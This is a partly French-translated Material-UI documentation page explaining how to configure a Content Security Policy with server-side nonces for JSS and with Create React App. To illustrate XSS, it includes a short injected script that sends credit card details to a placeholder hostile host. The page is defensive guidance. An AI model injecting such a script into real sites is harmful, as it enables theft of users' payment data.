# Politique de sécurité du contenu (CSP)

<p class="description">This section covers the details of setting up a CSP.</p>

## Qu'est-ce que le CSP et en quoi est-ce utile ?

CSP mitigates cross-site scripting (XSS) attacks by requiring developers to whitelist the sources their assets are retrieved from. Cette liste est renvoyée en tant qu'en-tête du serveur. Par exemple, disons que vous avez un site hébergé à `https://example.com` l'en-tête CSP `default-src: 'self';` autorisera toutes les requêtes à destination de `https://example.com/*` et refusera tous les autres. Si une section de votre site Web est vulnérable au XSS dans laquelle une entrée d'utilisateur non échappée est affichée, un attaquant pourrait saisir quelque chose du genre :

```html
<script>
  sendCreditCardDetails('https://hostile.example');
</script>
```

Cette vulnérabilité permettrait à l'attaquant d'exécuter n'importe quoi. Cependant, avec un en-tête CSP sécurisé, le navigateur ne chargera pas ce script.

You can read more about CSP on the [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).

## Comment met-on en place un CSP?

### Server-Side Rendering (SSR)

To use CSP with Material-UI (and JSS), you need to use a nonce. A nonce is a randomly generated string that is only used once, therefore you need to add server middleware to generate one on each request. JSS a un [ excellent tutoriel ](https://github.com/cssinjs/jss/blob/master/docs/csp.md) comment y parvenir avec Express et React Helmet. Pour un aperçu de base, continuez à lire.

Un nonce CSP est une chaîne codée en Base 64. Vous pouvez en générer un comme ceci:

```js
import uuidv4 from 'uuid/v4';

const nonce = new Buffer(uuidv4()).toString('base64');
```

You must use UUID version 4, as it generates an **unpredictable** string. Vous appliquez ensuite ce nonce à l'en-tête CSP. Un en-tête CSP pourrait ressembler à ceci avec le nonce appliqué:

```js
header('Content-Security-Policy').set(
  `default-src 'self'; style-src: 'self' 'nonce-${nonce}';`,
);
```

You should pass the nonce in the `<style>` tag on the server.

```jsx
<style
  id="jss-server-side"
  nonce={nonce}
  dangerouslySetInnerHTML={{
    __html: sheets.toString(),
  }}
/>
```

Ensuite, vous devez transmettre ce nonce à JSS afin qu’il puisse l’ajouter aux balises `<style>` suivantes.

The way that you do this is by passing a `<meta property="csp-nonce" content={nonce} />` tag in the `<head>` of your HTML. JSS will then, by convention, look for a `<meta property="csp-nonce"` tag and use the `content` value as the nonce.

Here is an example of what a fictional header could look like:

```html
<head>
  <meta property="csp-nonce" content="this-is-a-nonce-123" />
</head>
```

### Create React App (CRA)

According to the [Create React App Docs](https://create-react-app.dev/docs/advanced-configuration/), a Create React App will dynamically embed the runtime script into index.html during the production build by default. This will require a new hash to be set in your CSP during each deployment.

To use a CSP with a project initialized as a Create React App, you will need to set the `INLINE_RUNTIME_CHUNK=false` variable in the `.env` file used for your production build. This will import the runtime script as usual instead of embedding it, avoiding the need to set a new hash during each deployment.
